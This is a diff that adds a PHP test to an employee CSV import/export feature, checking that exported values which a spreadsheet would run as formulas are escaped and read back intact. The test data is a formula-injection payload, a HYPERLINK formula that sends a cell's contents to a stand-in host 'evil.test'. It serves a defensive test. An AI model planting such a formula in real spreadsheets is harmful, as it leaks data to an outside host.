@@ -250,3 +250,16 @@ it('keeps review decisions inside the chosen mode', function () {
         ->and(fn () => app(EmployeeImports::class)->resolveReview($row, 'update'))->toThrow(RuntimeException::class, 'add new employees')
         ->and(app(EmployeeImports::class)->resolveReview($row, 'skip')->action)->toBe('skip');
 });
+
+it('exports a value a spreadsheet would run as a formula as plain text, and reads it back exactly when re-imported', function () {
+    $formula = '=HYPERLINK("https://evil.test/?"&B2,"Bhavna")';
+    $this->boss->person->forceFill(['middle_name' => $formula])->save();
+
+    $csv = app(EmployeeImports::class)->export(Employee::query(), $this->hr);
+    $exported = str_getcsv(explode("\n", trim($csv))[1], escape: '');
+
+    expect($exported)->toContain("'".$formula)->not->toContain($formula);
+
+    $import = app(EmployeeImports::class)->inspect(stageCsv($csv, 'employees.csv'));
+    expect($import->rows()->first()->data['Middle name'])->toBe($formula);
+});
